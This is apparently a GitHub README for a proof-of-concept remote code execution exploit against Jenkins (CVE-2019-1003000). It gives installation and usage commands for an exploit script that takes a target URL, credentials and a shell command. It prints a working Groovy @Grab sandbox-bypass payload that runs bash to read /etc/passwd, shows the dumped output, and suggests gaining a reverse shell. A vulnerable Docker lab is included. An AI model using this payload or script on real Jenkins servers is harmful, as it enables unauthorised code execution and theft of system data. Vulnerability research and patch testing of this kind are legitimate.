# PoC: Jenkins RCE
##### SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)

> A proof of concept to allow users with Overall/Read permission and Job/Configure (and optional Job/Build) to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node.

> **Update**: An article by [Orange Tsai](https://twitter.com/orange_8361) explaining the exploit chain utilizing CVE-2018-1000861 and CVE-2019-1003000 that bypass the need of Overall/Read permission for a pre-auth RCE:
http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html


## Installation

```bash
$ git clone https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git
$ cd cve-2019-1003000-jenkins-rce-poc
$ pip install -r requirements.txt
```


## Usage
Pass target url, job name, username/password credential, and system command to be executed, as arguments.
```bash
$ python exploit.py --url http://jenkins-site.com --job job_name --username your_user --password your_passwd --cmd "cat /etc/passwd"
```

## Explanation

Quoted from [Red Hat Bugzilla - Bug 1667566](https://bugzilla.redhat.com/show_bug.cgi?id=1667566):

> A flaw was found in Pipeline: Declarative Plugin before version 1.3.4.1, Pipeline: Groovy Plugin before version 2.61.1 and Script Security Plugin before version 1.50. Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as @Grab to source code elements. Both the pipeline validation REST APIs and actual script/pipeline execution are affected. This allowed users with Overall/Read permission, or able to control Jenkinsfile or sandboxed Pipeline shared library contents in SCM, to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node. All known unsafe AST transformations in Groovy are now prohibited in sandboxed scripts.

This PoC is using a user with Overall/Read and Job/Configure permission to execute a maliciously modified build script in sandbox mode, and try to bypass the sandbox mode limitation in order to run arbitraty scripts (in this case, we will execute system command).

As a background, Jenkins's pipeline build script is written in groovy. This build script will be compiled and executed in Jenkins master or node, containing definition of the pipeline, e.g. what to do in slave nodes. Jenkins also provide the script to be executed in _sandbox mode_. In sandbox mode, all dangerous functions are blacklisted, so regular user cannot do anything malicious to the Jenkins server.

However, because the build script is written in Groovy, we can use any class or function in Java packages (However in sandbox mode, dangerous built-in ones are blacklisted). In this case, we are using AST transforming annotations `@Grab` to make jenkins import arbitrary java packages from external maven repository. In this PoC, I use `ProcBuilder` class defined in `org.buildobjects:jproc:2.2.3` in order to run system shell command.

The payload is defined as below:
```
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }
print new ProcBuilder("/bin/bash").withArgs("-c","cat /etc/passwd").run().getOutputString()
```

The script above will be compiled and executed in Jenkins master or node. After the job build is done, we can see the result of the shell command `cat /etc/passwd` in the job console output. Moreover, we can utilize this RCE to gain reverse shell, and literally _pwn_ the Jenkins server!


## Example Vulnerable Site

An example vulnerable jenkins is provided in this repository at directory `sample-vuln` in Docker container format. After booting up, the container image will have a jenkins site hosted on port tcp/8080, with a regular user with Overall/Read + Job/Configure + Job/Build permission with credential `user1:user1`, and pipeline job with id `my-pipeline`.

```bash
$ cd sample-vuln
$ ./run.sh


$ cd ..
$ python exploit.py --url http://localhost:8080 --job my-pipeline --username user1 --password user1 --cmd "cat /etc/passwd"

[+] connecting to jenkins...
[+] crafting payload...
[+] modifying job with payload...
[+] putting job build to queue...
[+] waiting for job to build...
[+] restoring job...
[+] fetching output...
[+] OUTPUT:
Started by user User 1
Running in Durability level: MAX_SURVIVABILITY
[Pipeline] echo
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
jenkins:x:1000:1000:Linux User,,,:/var/jenkins_home:/bin/bash

[Pipeline] End of Pipeline
Finished: SUCCESS
```


## Reference
- [Jenkins Security Advisory 2019-01-08](https://jenkins.io/security/advisory/2019-01-08/)
- [Jenkins upstream patch](https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c)
- [Red Hat Bugzilla - Bug 1667566](https://bugzilla.redhat.com/show_bug.cgi?id=1667566)
- [Jenkins Script Security Plugin](https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin)
